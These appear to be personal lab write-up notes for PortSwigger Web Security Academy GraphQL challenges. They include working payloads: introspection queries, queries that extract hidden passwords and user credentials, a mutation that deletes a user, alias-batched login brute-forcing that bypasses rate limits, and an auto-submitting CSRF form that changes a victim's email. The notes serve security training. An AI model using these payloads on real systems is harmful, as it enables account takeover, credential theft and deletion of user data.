
### Introspection Query
On Burpsuite Professional there's feature that allow us to customize GraphQL query more flexible
```graphql
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
            ...FullType
        }
        directives {
            name
            description
            locations
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```
### Accessing private GraphQL posts
**Payload** :
we can use full of introspection query to reveal field of password
after that, use this query to reveal the postPassword field which hidden post is post 3
```graphql

    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            postPassword
        }
    }
```

### Accidental exposure of private GraphQL fields
**Payload** :
First using intropection query to retrieve all information, reliaze that there's a function called `getUser` which use object of `User`, that have field id, username, password. After that call getUser function, which argumen id, retrieve username and password.
```graphql
    query getBlogPost($id: Int!) {
        getUser(id: $id) {
            username
            password
        }
    }
```
```json
{
	"query":"\n    query getBlogPost($id: Int!) {\n        getUser(id: $id) {\n            username\n            password\n        }\n    }",
	"operationName":"getBlogPost",
	"variables":{
		"id":1
		}
}
```

### asdf
**Payload** :
First convert our intropections query to query form
```http
GET /api?query=query%7b__schema%0a%7bqueryType%7bname%7dmutationType%7bname%7dsubscriptionType%7bname%7dtypes%7b...FullType%7ddirectives%7bname+description+locations+args%7b...InputValue%7d%7d%7d%7d%0afragment+FullType+on+__Type+%7b++++kind++++name++++description++++fields%28includeDeprecated%3a+true%29+%7b++++++++name++++++++description++++++++args+%7b++++++++++++...InputValue++++++++%7d++++++++type+%7b++++++++++++...TypeRef++++++++%7d++++++++isDeprecated++++++++deprecationReason++++%7d++++inputFields+%7b++++++++...InputValue++++%7d++++interfaces+%7b++++++++...TypeRef++++%7d++++enumValues%28includeDeprecated%3a+true%29+%7b++++++++name++++++++description++++++++isDeprecated++++++++deprecationReason++++%7d++++possibleTypes+%7b++++++++...TypeRef++++%7d%7dfragment+InputValue+on+__InputValue+%7b++++name++++description++++type+%7b++++++++...TypeRef++++%7d++++defaultValue%7dfragment+TypeRef+on+__Type+%7b++++kind++++name++++ofType+%7b++++++++kind++++++++name++++++++ofType+%7b++++++++++++kind++++++++++++name++++++++++++ofType+%7b++++++++++++++++kind++++++++++++++++name++++++++++++%7d++++++++%7d++++%7d%7d HTTP/2


```
After that we got information that there's some operation like deleteOrganizationUser to delete user, but it required id of user. since we don't know what id of carlos
![[Pasted image 20260119200058.png]]

use query to get username of id on variables (bruteforce it)
```http
GET /api?query=query+GetUser%28%24id%3a+Int%21%29+%7b%0d%0a++getUser%28id%3a+%24id%29+%7b%0d%0a++++id%0d%0a++++username%0d%0a++%7d%0d%0a%7d&variables={"id":3} HTTP/2


```

Then call deleteOrganizationUser operation to with id 3
```http
GET https://0a8c000904bfb25a80b4cba600f1002d.web-security-academy.net/api?query=mutation+DeleteUser%28%24id%3a+Int%21%29+%7b%0d%0a++deleteOrganizationUser%28input%3a+%7b+id%3a+%24id+%7d%29+%7b%0d%0a++++user+%7b%0d%0a++++++id%0d%0a++++++username%0d%0a++++%7d%0d%0a++%7d%0d%0a%7d&variables=%7b%22id%22%3a3%7d HTTP/2
```

### Bypassing GraphQL brute force protections
**Payload** :
On login mechanism, API send graphQL operations, we just need to adjust input with hardcoded username and password. ask AI to generate aliases by total of wordlist password
```graphql
mutation login{
  login1: login(input: { username: "carlos", password: "123456" }) { token success }
  login2: login(input: { username: "carlos", password: "password" }) { token success }
  login3: login(input: { username: "carlos", password: "12345678" }) { token success }
  login4: login(input: { username: "carlos", password: "qwerty" }) { token success }
  login5: login(input: { username: "carlos", password: "123456789" }) { token success }
  login6: login(input: { username: "carlos", password: "12345" }) { token success }
  login7: login(input: { username: "carlos", password: "1234" }) { token success }
  login8: login(input: { username: "carlos", password: "111111" }) { token success }
  login9: login(input: { username: "carlos", password: "1234567" }) { token success }
  login40: login(input: { username: "carlos", password: "buster" }) { token success }
  login41: login(input: { username: "carlos", password: "soccer" }) { token success }
  login42: login(input: { username: "carlos", password: "harley" }) { token success }
  login43: login(input: { username: "carlos", password: "batman" }) { token success }
  login44: login(input: { username: "carlos", password: "andrew" }) { token success }
}
```
![[Pasted image 20260119203221.png]]

### Performing CSRF exploits over GraphQL
**Payload** 
```html
Header
Content-Type: text/html; charset=utf-8

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a7c00c3044c741c844ae0b0009c0084.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation&#32;changeEmail&#123;&#32;changeEmail&#40;input&#58;&#32;&#123;&#32;email&#58;&#32;&quot;asdfdsdf&#64;gmail&#46;com&quot;&#32;&#125;&#41;&#32;&#123;&#32;email&#32;&#125;&#32;&#125;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

just change the form to x-www-form-urlencoded, actually on my handmade payload it work on myself, but idk why it didn't solve when it deliver to victim. so i recreate using Engagment tools